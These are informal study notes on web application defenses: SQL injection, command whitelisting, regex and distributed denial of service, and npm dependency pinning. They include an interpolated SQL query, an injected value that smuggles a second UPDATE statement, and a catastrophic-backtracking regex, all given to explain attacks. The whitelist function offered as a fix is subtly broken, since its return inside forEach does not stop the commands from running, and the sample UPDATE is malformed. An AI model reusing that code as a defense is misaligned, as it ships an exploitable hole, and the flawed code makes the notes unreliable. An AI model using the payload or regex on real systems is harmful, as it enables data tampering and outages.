  q.where(`username = ${username}`);
  q.then((res) => {
    return `username is : ${res}`;
  });
};
```

- prepared statements, it set in stone prior to the user-submitted data being presentted into SQL. the query cannot change 

SQL injection risk and are supported by almost every major SQL database: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, etc.

    + mysql 
```
PREPARE q FROM 'SELECT name, barCode from products WHERE price <= ?';
SET @price = 12;
EXECUTE q USING @price;
DEALLOCATE PREPARE q;
```
prepared statement, q is compiled prior to being executed with @price. Even if @price was set equal to 5; UPDATE users WHERE id = 123 SET balance = 10000, the additional query would not fire as it would not be compiled by the database.

- database specific defense, QUOTE function in MySQL will escape backslashes, single quotes, or NULL

- whitelisting commands 

```
const cli = require('../util/cli');

const commands = [
 'print',
 'cut',
 'copy',
 'paste',
 'refresh'
];

/*
 * Accepts commands from the client, runs them against the CLI ONLY if
 * they appear in the whitelist array.
 */
const postCommands = function(req, res) {
  const userCommands = req.body.commands;
  userCommands.forEach((c) => {
    if (!commands.includes(c)) { return res.sendStatus(400); }
  });
  cli.run(req.body.commands);
};
```


# Defending against DoS 
- DoS attacks are structured with one or more of the following results in mind 

Exhaust server resources 

Exhaust client resources 

Request unavailable resource 

- Regex DoS attacks are likely the easiest form of DoS to defend against

a form similar to (a[ab]*)+, where the + suggests to perform a greedy match
 
- Logical DoS is much more difficult to detect and prevent than regex DoS.

- portecting against ddos 

Distributed denial of service attacks (DDoS) are much more difficult to defend against than DoS attacks that originate from a single attacker. While single-target DoS attacks often target a bug in application code (like an improperly written regex, or a resource-hogging API call)

- DDoS attacks usually do not target logic bugs, but instead attempt to overwhelm the target by sheer volume of legitimate-looking traffic

- DDoS Mitigation 

    + The easiest way to defend your web application against a DDoS attack is to invest in a bandwidth management service. 

    + web application architecture to mitigate DDoS risk. One common technique is known as blackholing, whereby you set up a number of servers in addition to a main application server



# Securing thrid-party dependencies 
-  dependency tree often looks like the following:Primary Application v1.6 → JQuery 3.4.0Primary Application v1.6 → SPA Framework v1.3.2 → JQuery v2.2.1Primary Application v1.6 → UI Component Library v4.5.0 → JQuery v2.2.1

$ npm list --depth=[depth].

- secure package management 

npm will include a caret (^) prior to any dependency by default. If you remove this caret, the dependency will use the exact version rather than the latest patch


- shrinkwrapping comes into play. Running the command npm shrinkwrap against an npm repo will generate a new file called npm-shrinkwrap.json







































































